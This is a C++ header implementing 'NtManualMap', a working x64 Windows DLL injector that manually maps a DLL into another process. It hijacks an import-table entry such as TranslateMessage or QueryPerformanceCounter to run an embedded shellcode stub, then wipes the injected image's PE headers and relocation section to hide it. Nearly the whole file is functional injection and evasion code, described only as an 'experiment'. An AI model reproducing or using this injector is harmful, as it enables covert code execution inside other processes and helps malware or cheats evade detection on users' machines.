#ifndef MAPPER_HPP
#define MAPPER_HPP

#include "ntldr.hpp"
#include <vector>
#include <string>
#include <fstream>
#include <iostream>
#include <sstream>

// ============================================================
//  NtManualMap — x64 Windows manual-mapping experiment
//  Features:
//    - PEB walking and native API resolution
//    - Manual Mapping (Section mapping, relocations, local import resolution)
//    - Generic Target IAT Hijack (TranslateMessage / PeekMessage / custom function)
//    - Execution via trampoline stub + self-restoring IAT pointer
//    - PE header and relocation-section clearing, then section protections
// ============================================================

namespace NtMapper {

    static void LogConsole(const std::string& msg) {
        std::cout << "[NtMapper] " << msg << std::endl;
    }

    inline std::string HexAddress(uint64_t address) {
        std::ostringstream out;
        out << "0x" << std::hex << address;
        return out.str();
    }

    typedef struct _PROCESS_BASIC_INFORMATION {
        NTSTATUS ExitStatus;
        PPEB PebBaseAddress;
        ULONG_PTR AffinityMask;
        LONG BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION;

    // Relocation processing on local image buffer before writing remote
    inline bool ProcessRelocations(BYTE* localImage, IMAGE_NT_HEADERS* ntHeaders, ULONGLONG newBase) {
        IMAGE_OPTIONAL_HEADER& opt = ntHeaders->OptionalHeader;
        ULONGLONG delta = newBase - opt.ImageBase;

        if (delta == 0) return true;

        IMAGE_DATA_DIRECTORY& relocDir = opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size == 0) return true;

        IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(localImage + relocDir.VirtualAddress);

        while (reloc->VirtualAddress) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < count; i++) {
                WORD type = entries[i] >> 12;
                WORD offset = entries[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* patch = (ULONGLONG*)(localImage + reloc->VirtualAddress + offset);
                    *patch += delta;
                } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD* patch = (DWORD*)(localImage + reloc->VirtualAddress + offset);
                    *patch += (DWORD)delta;
                }
            }
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }
        return true;
    }

    // Clear PE headers after the entry point has run.
    inline bool NtClearHeaders(NtApi& api, HANDLE hProcess, PVOID remoteBase, SIZE_T headerSize) {
        std::vector<BYTE> zeros(headerSize, 0);
        SIZE_T written = 0;
        PVOID baseAddr = remoteBase;
        SIZE_T regionSize = headerSize;
        ULONG oldProtect = 0;

        api.NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, PAGE_READWRITE, &oldProtect);
        NTSTATUS status = api.NtWriteVirtualMemory(hProcess, remoteBase, zeros.data(), headerSize, &written);
        api.NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, oldProtect, &oldProtect);
        return (status == 0);
    }

    // Find export address in target process IAT by walking remote PEB LDR modules (Strict Priority)
    inline bool FindIatTarget(NtApi& api, HANDLE hProcess, PEB& remotePeb, const std::vector<std::string>& candidateFuncs, uint64_t& outIatPtr, uint64_t& outOrigFuncAddr, std::string& matchedFunc) {
        SIZE_T read = 0;
        PEB_LDR_DATA ldrData = { 0 };
        if (api.NtReadVirtualMemory(hProcess, remotePeb.Ldr, &ldrData, sizeof(ldrData), &read) != 0) return false;

        // Loop priorities first to guarantee strict fallback order
        for (const auto& candidate : candidateFuncs) {
            PLIST_ENTRY pHead = &((PPEB_LDR_DATA)remotePeb.Ldr)->InMemoryOrderModuleList;
            LIST_ENTRY currentList = ldrData.InMemoryOrderModuleList;
            PVOID pCurrent = currentList.Flink;

            while (pCurrent && pCurrent != pHead) {
                LDR_DATA_TABLE_ENTRY moduleEntry = { 0 };
                if (api.NtReadVirtualMemory(hProcess, (BYTE*)pCurrent - sizeof(LIST_ENTRY), &moduleEntry, sizeof(moduleEntry), &read) != 0) break;

                PVOID targetBase = moduleEntry.DllBase;
                if (targetBase) {
                    IMAGE_DOS_HEADER targetDos;
                    if (api.NtReadVirtualMemory(hProcess, targetBase, &targetDos, sizeof(targetDos), &read) == 0 && targetDos.e_magic == IMAGE_DOS_SIGNATURE) {
                        IMAGE_NT_HEADERS targetNt;
                        if (api.NtReadVirtualMemory(hProcess, (BYTE*)targetBase + targetDos.e_lfanew, &targetNt, sizeof(targetNt), &read) == 0 && targetNt.Signature == IMAGE_NT_SIGNATURE) {
                            DWORD targetImportRVA = targetNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
                            if (targetImportRVA != 0) {
                                IMAGE_IMPORT_DESCRIPTOR impDesc;
                                int descOffset = 0;
                                while (true) {
                                    memset(&impDesc, 0, sizeof(impDesc));
                                    if (api.NtReadVirtualMemory(hProcess, (BYTE*)targetBase + targetImportRVA + descOffset, &impDesc, sizeof(impDesc), &read) != 0 || impDesc.Name == 0) break;

                                    int thunkOffset = 0;
                                    IMAGE_THUNK_DATA originalThunk;
                                    while (true) {
                                        memset(&originalThunk, 0, sizeof(originalThunk));
                                        DWORD thunkRVA = impDesc.OriginalFirstThunk ? impDesc.OriginalFirstThunk : impDesc.FirstThunk;
                                        if (api.NtReadVirtualMemory(hProcess, (BYTE*)targetBase + thunkRVA + thunkOffset, &originalThunk, sizeof(originalThunk), &read) != 0 || originalThunk.u1.AddressOfData == 0) break;

                                        if (!IMAGE_SNAP_BY_ORDINAL64(originalThunk.u1.Ordinal)) {
                                            char funcName[256] = { 0 };
                                            api.NtReadVirtualMemory(hProcess, (BYTE*)targetBase + originalThunk.u1.AddressOfData + 2, funcName, 255, &read);

                                            if (strcmp(funcName, candidate.c_str()) == 0) {
                                                outIatPtr = (uint64_t)targetBase + impDesc.FirstThunk + thunkOffset;
                                                api.NtReadVirtualMemory(hProcess, (void*)outIatPtr, &outOrigFuncAddr, sizeof(outOrigFuncAddr), &read);
                                                matchedFunc = candidate;
                                                return true;
                                            }
                                        }
                                        thunkOffset += sizeof(IMAGE_THUNK_DATA);
                                    }
                                    descOffset += sizeof(IMAGE_IMPORT_DESCRIPTOR);
                                }
                            }
                        }
                    }
                }
                pCurrent = moduleEntry.InMemoryOrderLinks.Flink;
            }
        }
        return false;
    }

    // Core NtManualMap logic
    inline bool NtManualMap(NtApi& api, DWORD processId, const std::vector<uint8_t>& dllBytes, const std::vector<std::string>& preferredHooks = { "QueryPerformanceCounter", "EnterCriticalSection", "TranslateMessage", "PeekMessageA", "PeekMessageW", "GetMessageA", "GetMessageW", "DispatchMessageA", "DispatchMessageW" }) {
        LogConsole("Initiating Manual Map injection...");
        if (dllBytes.size() < sizeof(IMAGE_DOS_HEADER)) {
            LogConsole("Error: Invalid DLL image size.");
            return false;
        }

        const BYTE* rawData = dllBytes.data();
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)rawData;
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            LogConsole("Error: Invalid DOS signature.");
            return false;
        }

        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(rawData + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE || !(ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL)) {
            LogConsole("Error: Provided binary is not a valid DLL.");
            return false;
        }

        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        LogConsole("Image Size: " + std::to_string(imageSize) + " bytes");

        HANDLE hProcess = NULL;
        OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
        NT_CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)processId, NULL };

        NTSTATUS status = api.NtOpenProcess(&hProcess,
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
            &objAttr, &clientId);

        if (status != 0 || !hProcess) {
            LogConsole("Error: NtOpenProcess failed with status: 0x" + std::to_string(status));
            return false;
        }

        PVOID remoteBase = NULL;
        SIZE_T allocSize = imageSize;
        status = api.NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &allocSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (status != 0 || !remoteBase) {
            LogConsole("Error: NtAllocateVirtualMemory failed.");
            api.NtClose(hProcess);
            return false;
        }
        LogConsole("Remote allocation base: " + HexAddress((uint64_t)remoteBase));

        std::vector<BYTE> localImage(imageSize, 0);
        memcpy(localImage.data(), rawData, ntHeaders->OptionalHeader.SizeOfHeaders);

        IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sections[i].SizeOfRawData == 0) continue;
            memcpy(localImage.data() + sections[i].VirtualAddress,
                   rawData + sections[i].PointerToRawData,
                   sections[i].SizeOfRawData);
        }

        IMAGE_NT_HEADERS* localNt = (IMAGE_NT_HEADERS*)(localImage.data() + dosHeader->e_lfanew);

        if (!ProcessRelocations(localImage.data(), localNt, (ULONGLONG)remoteBase)) {
            LogConsole("Error: ProcessRelocations failed.");
            api.NtClose(hProcess);
            return false;
        }

        // Import Resolution
        IMAGE_DATA_DIRECTORY& importDir = localNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir.Size > 0) {
            IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)(localImage.data() + importDir.VirtualAddress);
            while (importDesc->Name) {
                char* dllNameA = (char*)(localImage.data() + importDesc->Name);
                wchar_t dllNameW[128] = { 0 };
                for (int i = 0; dllNameA[i] && i < 127; i++) dllNameW[i] = (wchar_t)dllNameA[i];

                NT_UNICODE_STRING uModuleName;
                api.RtlInitUnicodeString(&uModuleName, dllNameW);

                HANDLE hModule = NULL;
                api.LdrLoadDll(NULL, 0, &uModuleName, &hModule);

                if (hModule) {
                    IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)(localImage.data() + importDesc->OriginalFirstThunk);
                    IMAGE_THUNK_DATA* func = (IMAGE_THUNK_DATA*)(localImage.data() + importDesc->FirstThunk);
                    if (!importDesc->OriginalFirstThunk) thunk = func;

                    while (thunk->u1.AddressOfData) {
                        PVOID procAddr = NULL;
                        if (IMAGE_SNAP_BY_ORDINAL64(thunk->u1.Ordinal)) {
                            ULONG ordinal = (ULONG)(thunk->u1.Ordinal & 0xFFFF);
                            api.LdrGetProcedureAddress((HMODULE)hModule, NULL, ordinal, &procAddr);
                        } else {
                            IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)(localImage.data() + thunk->u1.AddressOfData);
                            NT_ANSI_STRING aFuncName;
                            api.RtlInitAnsiString(&aFuncName, importByName->Name);
                            api.LdrGetProcedureAddress((HMODULE)hModule, &aFuncName, 0, &procAddr);
                        }

                        if (procAddr) {
                            func->u1.Function = (ULONGLONG)procAddr;
                        }
                        thunk++;
                        func++;
                    }
                }
                importDesc++;
            }
        }

        // Get Remote ImageBase
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        status = api.NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), nullptr);
        if (status != 0) {
            LogConsole("Error: NtQueryInformationProcess failed.");
            api.NtClose(hProcess);
            return false;
        }

        PEB remotePeb = { 0 };
        SIZE_T read = 0;
        status = api.NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &remotePeb, sizeof(remotePeb), &read);
        if (status != 0) {
            LogConsole("Error: Failed to read remote PEB.");
            api.NtClose(hProcess);
            return false;
        }

        uint64_t iat_function_ptr = 0;
        uint64_t original_function_addr = 0;
        std::string matchedHook = "";

        bool foundHook = FindIatTarget(api, hProcess, remotePeb, preferredHooks, iat_function_ptr, original_function_addr, matchedHook);
        if (!foundHook) {
            LogConsole("Error: Could not locate suitable IAT hook target function.");
            api.NtClose(hProcess);
            return false;
        }

        LogConsole("Hooking target function: " + matchedHook + " [IAT Ptr: " + HexAddress(iat_function_ptr) + "]");

        // Shellcode stub to invoke DllMain(remoteBase, DLL_PROCESS_ATTACH, 1) and restore original IAT pointer
        uint8_t dll_stub[] = {
            0x51,0x52,0x55,0x56,0x53,0x57,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,
            0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x48,0xB8,
            0xFF,0x00,0xDE,0xAD,0xBE,0xEF,0x00,0xFF, // +0x18 = iat_function_ptr
            0x48,0xBA,
            0xFF,0x00,0xDE,0xAD,0xC0,0xDE,0x00,0xFF, // +0x22 = original_function_addr
            0x48,0x89,0x10,0x48,0x31,0xC0,0x48,0x31,0xD2,0x48,0x83,0xEC,0x28,0x48,0xB9,
            0xDE,0xAD,0xBE,0xEF,0xDE,0xAD,0xBE,0xEF, // +0x39 = remote module base
            0x48,0x31,0xD2,0x48,0x83,0xC2,0x01,0x48,0xB8,
            0xDE,0xAD,0xC0,0xDE,0xDE,0xAD,0xC0,0xDE, // +0x4A = EntryPoint address
            0xFF,0xD0,0x48,0x83,0xC4,0x28,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,
            0x41,0x5B,0x41,0x5A,0x41,0x59,0x41,0x58,0x5F,0x5B,0x5E,0x5D,0x5A,0x59,
            0x48,0x31,0xC0,0xC3
        };

        uint64_t EntryPoint = (uint64_t)remoteBase + localNt->OptionalHeader.AddressOfEntryPoint;
        *(uint64_t*)(dll_stub + 0x18) = iat_function_ptr;
        *(uint64_t*)(dll_stub + 0x22) = original_function_addr;
        *(uint64_t*)(dll_stub + 0x39) = (uint64_t)remoteBase;
        *(uint64_t*)(dll_stub + 0x4a) = EntryPoint;

        SIZE_T written = 0;
        status = api.NtWriteVirtualMemory(hProcess, remoteBase, localImage.data(), imageSize, &written);
        if (status != 0) { api.NtClose(hProcess); return false; }

        PVOID stubBase = NULL;
        SIZE_T stubSize = sizeof(dll_stub);
        status = api.NtAllocateVirtualMemory(hProcess, &stubBase, 0, &stubSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (status != 0) { api.NtClose(hProcess); return false; }

        api.NtWriteVirtualMemory(hProcess, stubBase, dll_stub, sizeof(dll_stub), &written);

        PVOID iatPtr = (PVOID)iat_function_ptr;
        SIZE_T iatSize = sizeof(uint64_t);
        ULONG oldIatProt = 0;
        api.NtProtectVirtualMemory(hProcess, &iatPtr, &iatSize, PAGE_READWRITE, &oldIatProt);
        api.NtWriteVirtualMemory(hProcess, (PVOID)iat_function_ptr, &stubBase, sizeof(uint64_t), &written);

        LogConsole("Waiting for hook execution in target process...");
        uint64_t current_iat = 0;
        bool hookExecuted = false;
        for (int i = 0; i < 300; i++) { // 30 seconds max
            api.NtReadVirtualMemory(hProcess, (PVOID)iat_function_ptr, &current_iat, sizeof(current_iat), &read);
            if (current_iat == original_function_addr) {
                hookExecuted = true;
                break;
            }
            Sleep(100);
        }

        if (hookExecuted) {
            LogConsole("Hook executed & original function pointer restored.");
        } else {
            LogConsole("Error: Execution timeout (target thread might be dormant).");
        }

        iatPtr = (PVOID)iat_function_ptr;
        api.NtProtectVirtualMemory(hProcess, &iatPtr, &iatSize, oldIatProt, &oldIatProt);

        if (!hookExecuted) {
            api.NtClose(hProcess);
            return false;
        }

        // Security headers & sections protection
        NtClearHeaders(api, hProcess, remoteBase, ntHeaders->OptionalHeader.SizeOfHeaders);

        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            PVOID sectionAddr = (BYTE*)remoteBase + sections[i].VirtualAddress;
            SIZE_T sectionSize = sections[i].Misc.VirtualSize;
            if (sectionSize == 0) continue;

            char secName[9] = { 0 };
            memcpy(secName, sections[i].Name, 8);

            if (secName[0] == '.' && secName[1] == 'r' && secName[2] == 'e' && secName[3] == 'l') {
                std::vector<BYTE> zeros(sectionSize, 0);
                SIZE_T w = 0;
                ULONG oldProt = 0;
                api.NtProtectVirtualMemory(hProcess, &sectionAddr, &sectionSize, PAGE_READWRITE, &oldProt);
                api.NtWriteVirtualMemory(hProcess, sectionAddr, zeros.data(), sectionSize, &w);
                api.NtProtectVirtualMemory(hProcess, &sectionAddr, &sectionSize, PAGE_READONLY, &oldProt);
                continue;
            }

            DWORD ch = sections[i].Characteristics;
            ULONG prot = PAGE_READONLY;

            bool exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
            bool read  = (ch & IMAGE_SCN_MEM_READ)    != 0;
            bool write = (ch & IMAGE_SCN_MEM_WRITE)   != 0;

            if (exec && write)      prot = PAGE_EXECUTE_READWRITE;
            else if (exec && read)  prot = PAGE_EXECUTE_READ;
            else if (exec)          prot = PAGE_EXECUTE;
            else if (write)         prot = PAGE_READWRITE;
            else if (read)          prot = PAGE_READONLY;

            ULONG oldProt = 0;
            api.NtProtectVirtualMemory(hProcess, &sectionAddr, &sectionSize, prot, &oldProt);
        }

        api.NtClose(hProcess);
        LogConsole("Injection successfully finished.");
        return true;
    }
}

#endif // MAPPER_HPP
